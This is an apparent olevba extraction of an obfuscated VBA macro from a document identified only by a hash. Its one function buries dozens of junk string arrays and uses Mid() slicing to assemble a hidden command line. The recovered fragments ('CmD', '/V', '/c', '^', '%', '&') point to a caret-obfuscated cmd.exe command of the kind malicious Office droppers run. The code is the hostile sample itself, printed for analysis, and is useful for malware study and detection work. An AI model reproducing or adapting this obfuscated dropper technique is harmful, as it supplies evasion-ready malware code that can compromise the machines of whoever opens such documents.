Filename     : ./macros/f8d9ffc5ec38f6f0f367fcc41184d32ab4b5e8a988958b38c9197ceb1b5a4f6e
OLE stream   : Macros/VBA/koiiMYjrc
VBA filename : koiiMYjrc.bas
----------------------------------------
Attribute VB_Name = "koiiMYjrc"
Function hsOHJmcuT()
zlfGkqFPDUj = "QQuNcEFtjCmnsLDQTTPijzidNfB"
LXlZWjz = Array("rpJEtnKs", "CEqJIsBw", "usrUjZvU", "oaojEbJs", "mrfSDfAF", "jpJvbUkZ", "XbKuoEbR", "toPSwbob")
uzTBQ = Mid(zlfGkqFPDUj, 10, 2)
CLmzXRYWCE = Array("FihiiYPn", "dijvWNuS", "ViAOVLPJ", "KiljORmu", "mSUHHcfw", "YMDWHNjt", "stiMzSdt", "SYYEnfZL")
wrwvb = "G jzzinjiRPG"
bmLNk = Array("srWRdYuq", "klzBsBZj", "wtkzWzsW", "qSGjLODM", "znzZSEOA", "ZwuaiCNi", "iZhlbIVt", "wzbKSKiV")
PWFdOVSz = Mid(wrwvb, 2, 1)
BqtVXCQ = Array("icthzOWX", "DXuUKBOi", "LiSVGYtp", "YTkJRLiD", "wtYqnUuh", "YEfrQpVr", "ZTofLbDF", "jEIfiMFr")
rQwirUIQJf = "rUYErD jSIKR"
PRctGv = Array("WPWjEjcJ", "jGrrlfKr", "ZllFHWcw", "EbbOONzA", "jvHAXXBX", "oUziijbU", "SCVVNVzz", "mZbdENuV")
YYFcZKjbKr = Mid(rQwirUIQJf, 7, 1)
HXUTuJPEDW = Array("CJEfYznz", "ractLtHV", "SsMqzoJa", "ldspWkEM", "XfpasIIG", "wHCiQuDG", "DRdhkabN", "zdtvHwaG")
EkWnEZXfw = "GjDm HIlUVCqUbGsbDpVNQXz"
JAoBquOP = Array("bTNSjqjD", "Nwidjiou", "JVijwpZt", "IihjifEm", "zIDkqShD", "afJpnoqD", "iFYOtkfl", "tTKEJCZh")
THtFEk = Mid(EkWnEZXfw, 5, 1)
RSTSsXfYmNJ = Array("vqMzbWwN", "KniZsnFj", "jZlouVIs", "wumYtjML", "MZEOAdMo", "KRmiDEkR", "uJiWlSRZ", "hTzhjXTd")
nJfGC = "zDzJULKpDsvqMiqF"
JTUdiBYLbO = Array("NCZAowON", "MEoTkzdz", "LaHhWizj", "RSauvitG", "luLZbkik", "UjRSbfiR", "cFfjPZMf", "EqjWVURi")
pVWYsj = Mid(nJfGC, 13, 2)
bJYjfNmv = Array("hlMEnJMY", "BbXZQalP", "NiJSMNWG", "AwwoRSNV", "zPlpAAVE", "dsdZcBkX", "hjwiXPwT", "OGEqKXHi")
cnwLwiIi = "zocAEWwbzsCbC/V sjO"
zfMuOjV = Array("DORGLAHl", "ujvcUoZN", "WHEqnCLH", "FjkYziGu", "uiFDVciV", "oAtzadkZ", "ESwFJLPA", "CJBfPjmL")
EwvaZEkwrqU = Mid(cnwLwiIi, 14, 3)
wzGdoQzihF = Array("HMVhYOop", "itJvSzzK", "SvCDZCwr", "AFBanapv", "dLlzCjBT", "IwiJRmju", "WwmnjWGF", "OijSMOCD")
MKVMWtcaMwj = "MsIiuD aXFbAfLHT"
UApqRLL = Array("YNwMJNjw", "IMJlOJKU", "oATjwBuV", "HXCozHXG", "CfHlquwN", "EQCmGQNA", "EwGzSzHW", "TcEmLuBB")
csbJhwuiti = Mid(MKVMWtcaMwj, 6, 2)
YCMkh = Array("czYbpHjA", "TkGjVIZm", "OKiCUAoJ", "JuIuUNMt", "lJzLDPBV", "silfwpGI", "bnPLwPBb", "JPSuwlfF")
wuzKjPGtNS = "qOowwzkKjKtituS wMJmzb"
bTtAYtMr = Array("iYjZVarp", "Ewbpnupo", "AGBIiVqh", "AvnCabks", "jiWzfJPY", "TNwSzPZX", "OJYMHDrN", "hwYanpOc")
iSNRLjPzdkz = Mid(wuzKjPGtNS, 16, 3)
dPhFF = Array("ERSwJKKj", "DFiofcjw", "OGAdkszN", "AjrBThWF", "IFHFHYBD", "BvFFXMik", "zLCBOaEM", "SEzZTJMW")
FULadzt = "JmomF   fEQTKdwkTKkJNQKQ"
JfaCVSmSZb = Array("RoujSLJj", "RUmjCrTp", "dXbLohRS", "zGYqYpuT", "JiVtJDaw", "mMzoVmdp", "wWXiQhqj", "WbjMnTLc")
jKwWMZ = Mid(FULadzt, 6, 3)
wZvTRuVVZ = Array("sJSFSSbB", "PPPVBFRQ", "TIRwkLdB", "tRQjHkwa", "bSmFHjqw", "LDJmhEnt", "IwwRJISj", "jRLBCrtf")
DINJaLMDp = "qzUItJhiKmEMdIqszsHEbnA  IDi"
dlFSdc = Array("zSdizOls", "zTbQPkrY", "alrJitzl", "uArBtQZs", "MIHjLuAN", "aHbbioAb", "uYmYnrwG", "VrnwXjzi")
wNYpzrj = Mid(DINJaLMDp, 24, 2)
jAQucuToZ = Array("VFbKPvwW", "PTLUhQSY", "jcCwdEsq", "NDlTViUs", "rzQEnqdj", "XNpHwocz", "cLAavGEQ", "MlzMJiBj")
WWSCrB = "XOKIihzhiFJZ%dZCUESpFzrAJaUlnksirZUGv"
wFlchUjRsw = Array("oprKazfw", "AILLrKJJ", "KkfmJwJf", "VRkUiMhu", "jwPjoUGY", "iPnBqWNU", "cboInYis", "fLpJMLUn")
OmCzYn = Mid(WWSCrB, 13, 1)
nZjnv = Array("nsRZnKUH", "QYIYNwMm", "NLiYCiOi", "opRBwXjT", "jCVPGOLa", "NrrDVffh", "WKNnJBhE", "imkwsSKs")
QkpVXS = "ciiANNJdac  RL"
lBwCCzCJV = Array("WimwqOlP", "nAEXJXIu", "VhlpTXaO", "LEmUAlFt", "cQEnDJrT", "QTLmTPWS", "NfkTEDVz", "HXklbRPC")
VpLvpLZjoc = Mid(QkpVXS, 10, 3)
NCtJT = Array("vowJjQIj", "qswZubqb", "odFnsPzd", "kbPSrCWN", "nwkcpZqF", "iUFbVqFi", "hBiwnYnf", "pVZFApso")
uiWzbPdKr = "OZmiiCnPzBFmBcuITUCBHtQC^PRwRCJcVtEhnOw"
KjAiEJD = Array("MzqOoozi", "mPbFwvui", "hPTFsYal", "MYVnoLmd", "WDhPhmjn", "ZMrpZcqo", "rMimMVqo", "YFBQTLtb")
CpCssF = Mid(uiWzbPdKr, 24, 2)
NwLmIB = Array("ZZvCvndF", "VPfcIBuZ", "SLElCkpJ", "HilwimCf", "ltNFZkYo", "KzmuPYAV", "cYuiFAho", "jmvMCjbi")
uGiEzTz = "XQvaqzrMzzEocoSOIQwzMM"
CLNmwNpG = Array("JdYNOoDu", "mbvmDQCY", "GzmhYnwj", "ztAowiSr", "WfXWYRhj", "cnzNuzYF", "HWfqvraV", "foNVoPwH")
EnuwCDd = Mid(uGiEzTz, 8, 1)
wBHsF = Array("LTMQXkrm", "GiQzzkKC", "lCjUiizC", "VlvKNHZn", "ZkVWwrQI", "Zvfhzwiw", "Xfilopkc", "VKvmphZz")
UYawEX = "MIjBRPMBPRu  nczjvIpkNFvzdMczdNwwCPjLctES"
kmSqj = Array("TzBmTAUk", "jhDdnzvj", "vdDiwtZO", "VadPUFmQ", "vBJXAqlr", "jmJwnTVP", "jjMmUHMa", "YmQsXEPd")
vVVvA = Mid(UYawEX, 12, 2)
HBLGE = Array("ItvzjwUT", "hFDHDDtP", "UwjtKAdQ", "hYiwiVlF", "GRjsujNB", "phMdVBcF", "sDWsjrwI", "PiPIPYlL")
VibMRO = "iXtnraodPlOwFKfqKCzzKbLrOkLIpz PkX"
mGZzZnwrDn = Array("izMKVhdE", "aTPnnAvA", "QFbiEOUH", "AkiNjLQY", "iCWzjjij", "iKwzEGtL", "BGwNwEPT", "dFJkwQXP")
nQhthwDMQJ = Mid(VibMRO, 31, 1)
VHEbZnmkiQo = Array("rRpDXbQV", "nUhnFnco", "sACMFKFs", "wHJsmTmk", "auRuKnaj", "wRXEwwqD", "QHOYQTuj", "LzGPSYiU")
iNwjKuhzPr = "CQ hkhbGhktvrUiNiYr"
KGjsLKzt = Array("afwwcKCc", "lOmsaMba", "KIZiaVtu", "twnwUzXB", "nzXhImNp", "dBZwTdXQ", "pbVhusLE", "lBEdXFHn")
JqrTnfdLRWH = Mid(iNwjKuhzPr, 3, 1)
GOSGwmoz = Array("HmHhcpti", "rGjzNYbR", "wPbHDJKp", "fvzZLEfE", "APwQOWiN", "VKjzNFlq", "AjdKKFWz", "cRBjqTXm")
TqHGG = "AdiFH dBQvEcHEzEGdcJNjszIwVEGVVXGURiXG"
cdlkoMqvF = Array("NkVbGpsJ", "LzAILnDv", "FbIMrHUO", "wpMIRIwQ", "wPZsLWZQ", "wDfhtWpP", "umiJWOwF", "PGfQcjsC")
onYUUlMk = Mid(TqHGG, 6, 1)
RpcfjzlY = Array("ScfJsrsf", "vLjiDzDz", "JHjvjRaj", "bDGODFwz", "IbrOHzwj", "uYFndjwf", "FrNqiuiB", "Cwhokibq")
fvDwkDh = "nihaJhwYUOinoTELkwKlALPdiUZQNG"
wVsqGfTtav = Array("bEURliaO", "drwjbCMz", "tsjqIVKA", "OkzBcpkG", "PwPjhMpS", "zmDVJQRC", "SCnzwDiG", "uUDBjYln")
WDlKmjXZMth = Mid(fvDwkDh, 15, 1)
bzFWzUtIMO = Array("CwczFKPH", "vicajOjH", "rASmsKtw", "zXUhNJCX", "GOcCjdXb", "pJirlCdb", "zXBhMGAs", "EiAhqitm")
SdRWFYimitC = "OWmiPRrjTonBbXTk^SwsGQssYHjkdHuzawtsWwb"
izwZWqVftb = Array("GCPNaMTj", "BizFurPo", "UjlTbdSL", "WVEJQwUv", "rKlXaMfr", "ldMnYDlu", "QiKEXpTc", "jEqEIKQD")
IuCodDOflXi = Mid(SdRWFYimitC, 17, 2)
ibhYop = Array("fUUBaXAh", "jzmwtbCI", "UjkCGzjo", "ivmqYlrk", "hfBponiF", "FAFrZpaF", "EFJOSVIf", "lfXflJIu")
cUomOjibjd = "raInpjGc%tjpEpHmnUiFJWmrRJEwZlJbJG"
lXBqKCoYV = Array("BnVfctju", "cBFVGNLQ", "ALOnswmc", "OqDfpnhu", "OAufIDGW", "nFumhvVj", "twQKkklE", "BsRlpDEo")
DRLKk = Mid(cUomOjibjd, 8, 2)
wnLGMMdb = Array("LGkIAPdh", "VUOlLuuV", "zhEwHjJf", "tjuiKrTa", "QfSAlDFC", "tmdwTdji", "QWzWonRb", "wFORVwXd")
KUCzhHJ = "PSnnQAAUZft   mbpnBtMRtwcmmBwM"
uaYnv = Array("MAstjaDh", "LtRwsYZY", "okdvzobn", "uhUMwEVE", "ZDjMWlAI", "XHMiFfHZ", "akZTonOY", "ZFzBFqkH")
UKsAbNwuGNF = Mid(KUCzhHJ, 12, 3)
BdkdVMX = Array("KQmwiYdG", "DYACRRtQ", "ndSnFLRm", "nUUMXoMz", "KXhTMFSZ", "VJSsNPfk", "jboXYXcz", "wzINDRjO")
AovcUm = "jCkzzSjCiZtKrBiwifc wVHaqGGtELqFYm"
njAofuoOE = Array("miDTszQn", "VKZGvwEK", "huLkaWJs", "nfJfiiqu", "bisQPkIM", "QjuinEcQ", "RkXwXGoQ", "UKfMqlJm")
zqvXYFwmBo = Mid(AovcUm, 19, 2)
TwnjJ = Array("QrVXpoGI", "NZdJSvXS", "MJtCYscz", "ckvYSznz", "FzDXBYnj", "dSziuSDB", "MhXQpNLX", "OWuFsiqP")
SwGjMwOuE = "GM  rJsLAaTnMSbmdYMuWbWVvifYdWc"
LsplMUiEY = Array("wDAHBiOR", "lpUSITzn", "konVoAJw", "VrSZhiKu", "aMqIrqIt", "LZzBQkwN", "JACJFZNz", "uCmKQokD")
hYQPNKPMT = Mid(SwGjMwOuE, 3, 2)
HiXNzYwtL = Array("cnRTUzIo", "ijDjfwiv", "nGwHmXHJ", "fhzPuflA", "iXwzjVVI", "nUPoLszK", "cZrlrkCE", "jHnmztuC")
vbQZXjjtC = "piriOOJJGqscXjNAiJAfLczcOCH /cTt"
cUqUT = Array("EcFcmKbD", "ZssOaULZ", "nCwHMpPd", "wsklOHtU", "cXYwucSs", "UkcswkZW", "bEFjqkHP", "NcjtZqpR")
nMcvpVjAi = Mid(vbQZXjjtC, 28, 3)
fHzzTXR = Array("RnZElqsv", "UvbXYimA", "waVBiRzm", "ZsHCDArz", "SvsbYsAd", "JUrdbzFE", "DwoCkowA", "qnitjprT")
wQAprCBw = "howOTjDbTmIBiITXYNMGUHsEcvpRkJVJ"
DhNojvCV = Array("HZbjwClD", "hjYSjMVl", "piDhGHVu", "XQiivtLu", "SYiVhnDz", "PdwHNuwv", "uUizGisz", "DjIjUDIn")
QmQXVjE = Mid(wQAprCBw, 3, 1)
nBJcUXNkOb = Array("nHjBcHOv", "nukHQttk", "FvWczHwQ", "uJfDjonL", "fkwrwBNn", "EfXluIUA", "ABhjqlNj", "IQGTcKMz")
TLEtAlEZ = "iVvUTnic zojluasiFMP"
MsJocKLK = Array("jviaPUGu", "RwzhmdNz", "GoAqwDKj", "YpAniDzB", "BvldIroO", "JUpEYLud", "HLARzmQf", "luCZUTMO")
KiTuiMk = Mid(TLEtAlEZ, 7, 3)
cnYza = Array("dFHzfzhi", "YuJlrmcP", "obAwLvzm", "mYsjGLKN", "HRXHItKC", "zdIUZmSE", "jQOHCXth", "HVLGFzcN")
hCALU = "NWNp^nMuTbBwDqvfdBNqwpVn"
RYfsRdHwiB = Array("bMEjZvVK", "lftziUhU", "chDUzBsn", "hWXUFHwj", "mbFZpZaM", "BotSfBOW", "SDrVSfma", "TQzCYAFd")
sYSdUtIG = Mid(hCALU, 4, 2)
sMBjkVdO = Array("srTnCkir", "kHDROsJp", "oNizkvBT", "PihMrwfq", "MhTNUdbz", "GmNjluGA", "IWwiwZzw", "qAYTCWAm")
NcDjoP = "NLJuziVpitbVWETWFCUS& qQzsqpumj"
cAdbr = Array("mKQjPzOk", "GtflqvES", "iaXjwNdq", "bpdBmrQV", "fDTQUNoM", "qplwqTtU", "sVijjcbY", "jZEZWMzP")
cplbNN = Mid(NcDjoP, 21, 2)
TTUAtjKsIhf = Array("CScrplqB", "usdcNotN", "LLQHdSBf", "DcijoWGS", "LjZtzbEX", "csbGakuD", "MEZspVEk", "QzoNHGMY")
zVTVDnn = "pLs JlAnswPC"
zvlpoWsL = Array("EYGTKACK", "wPLwdaZT", "VCdrfimw", "kLiBBwwR", "twuOskzh", "BWWSonPO", "iUTHFDXZ", "lKizWAIC")
wNuEFF = Mid(zVTVDnn, 4, 1)
SGWkVitlzIm = Array("UPPGOTvp", "PEsDpOUH", "zjVMlcaM", "SZKLvMzU", "wWDTEplF", "AnwznzDI", "hEhVhAls", "pDnoJjuC")
QmQbHlparkp = "JMjmMojsMGXEkWA   qfIEwL"
aQAUnKuw = Array("QissdDqc", "PtvFdzvO", "jcjdSSsk", "iqILjzjc", "ARJInzEi", "FdFRVGDS", "MfRbKKqw", "pIJnuitP")
GSIAaWqHHtM = Mid(QmQbHlparkp, 16, 3)
dQwXGVJk = Array("louoUOOO", "hDltnBcK", "EMjRuDXm", "uWKUaYmD", "AuYZUczn", "WoZZqjqh", "lwFUKQMh", "QItzEunI")
hpSEiIVJ = "JEqhqhHcDqWYPKLIQQlSXrJa   NLwiEsQkpzABkk"
LCsHiwwtrjW = Array("UsJJKNcJ", "HFwKooGX", "JGcstozz", "ERonAjUW", "PhlzZnjz", "jwIFsjqM", "DrDFKzRf", "uJFsYpIY")
taUzjLV = Mid(hpSEiIVJ, 25, 3)
tIVzhlhOCaw = Array("NwEWSMZv", "LZzwFHDZ", "YDlFQivv", "HGAnFzFH", "ovwqwPvj", "IFtGpjwu", "LMFQKori", "BJOMLmqL")
IBEoJIjaBuz = "YoDLMilfbMwdNiljzFa  GNaKzjajiuiantqDzOV"
VUBJwfWOs = Array("CEGiEAkE", "UBHBwZFz", "NTDwXhrE", "zzCpzIZM", "aYNimIiB", "JklSjDfz", "PHJSdAiU", "NChHwvHM")
wcvOsjzFj = Mid(IBEoJIjaBuz, 20, 2)
ipVkQtPVdL = Array("FOJwXpnr", "SpQzhfcv", "HANAacpo", "rADGtMnL", "sCabKCfM", "tYiPjtmj", "CupGTnFd", "YVFWmhwF")
DaqqqTApwwb = "rNajHC   hBLaLMiDz"
IYIavh = Array("FXUTjdLR", "YOQFbImr", "ZTojQwBi", "YjEjpnij", "jffAwaYJ", "ckIGafSX", "NUrtBLiH", "WmuAYcbl")
AiDnL = Mid(DaqqqTApwwb, 7, 3)
hufGichQzCh = Array("AaLXjmRN", "QktudHOv", "TcGnhGtK", "KTYbVRfV", "ZKaljBEs", "WbikYTtF", "moBhUrlt", "jAMQNpsz")
sWhjCdlQZ = "EwtOiRciVXvDjNiXFbniEo^mLPtwC"
NbYni = Array("YAhOdMPJ", "BRMumdqw", "PodTpQsh", "pcsJLCkt", "XHqLDvTW", "ooBjdqOi", "fqjpvBIH", "IzZBTGww")
MTVtzMwLwl = Mid(sWhjCdlQZ, 22, 3)
JDdQVrCINF = Array("tDXTYQjs", "mtuEnHQu", "HDjimssC", "hZmLXoUt", "XZdDizCO", "SsFOMkJz", "iEwDBpkB", "LVmzdYVw")
ALRRrQihp = "ppMlMjPMdFLpTQrlwCjLnhObkj  wENuVbN"
OGICICji = Array("DNmLaZwK", "LJzYzEHv", "JiPQbChP", "tXfzqEzi", "fWwsowhc", "pEMUCwPo", "rtiTzKwB", "jXRDuzTG")
aNfhbpW = Mid(ALRRrQihp, 27, 3)
zYsXfJ = Array("EzLMGtif", "OdXEcKws", "qEKvfsEM", "XRrSDqZK", "RQjYvftB", "vHvzFbII", "CmOXdCXM", "twpoBMbY")
ihSqihv = "Gjzfj  sNUIFrwBC"
PRHIriFLjFi = Array("CRWRSkOH", "cWcHliDA", "RArmpSJL", "IjNMQvNV", "wDMtCzmD", "mWfPwjmD", "VJEVSsAk", "HKJjXBqh")
wbUFz = Mid(ihSqihv, 6, 2)
roCUvIIAE = Array("DknkCbqT", "JdLHNakA", "jtFIifzO", "ZjFjnTau", "kwHzmbQj", "jbtOKYPF", "oAiIlZnY", "mZKVVKfq")
WrwtPn = "cmQIAOGnPqicEizXLh"
MOhnF = Array("rrApDjaV", "vZiXfwHX", "LHQLUmtj", "AdrBcjjj", "WunwjpbQ", "kwFmnXMq", "kIjfcLXE", "wQpaoZsP")
JHNzcJABwXz = Mid(WrwtPn, 11, 2)
kdhrFVCo = Array("JOnomYGt", "cfvGlYKU", "iXvIQRbv", "HqmNXlnE", "FvVitIbW", "Zslinjif", "zLRBLWvs", "msjvmtWr")
NqjzTASzDX = "cwMiVKuzImUzCiMMVzNVDrsQvGJLSECqXFGSdBJ"
BJRBXkzN = Array("fBsiXFuf", "alhVUlEm", "iSQYtGZG", "hVImLiqi", "uGlYrwwJ", "uifmBTOb", "mhTCJCTZ", "blBCzITr")
SOTlbCUW = Mid(NqjzTASzDX, 2, 3)
fSnviqcb = Array("XPVrKJGo", "UrzjDbaY", "LHznqoCd", "WLojNHMw", "qVEVdjjL", "FVTQZkhV", "PpNFYjoj", "MrUwVabM")
hsOHJmcuT = uzTBQ + csbJhwuiti + aNfhbpW + EnuwCDd + KiTuiMk + SOTlbCUW + zqvXYFwmBo + wcvOsjzFj + iSNRLjPzdkz + JHNzcJABwXz + UKsAbNwuGNF + QmQXVjE + pVWYsj + VpLvpLZjoc + THtFEk + cplbNN + GSIAaWqHHtM + OmCzYn + CpCssF + MTVtzMwLwl + IuCodDOflXi + sYSdUtIG + WDlKmjXZMth + DRLKk + wbUFz + JqrTnfdLRWH + vVVvA + taUzjLV + EwvaZEkwrqU + jKwWMZ + hYQPNKPMT + wNuEFF + nMcvpVjAi + AiDnL + onYUUlMk + PWFdOVSz + nQhthwDMQJ + wNYpzrj + YYFcZKjbKr
End Function
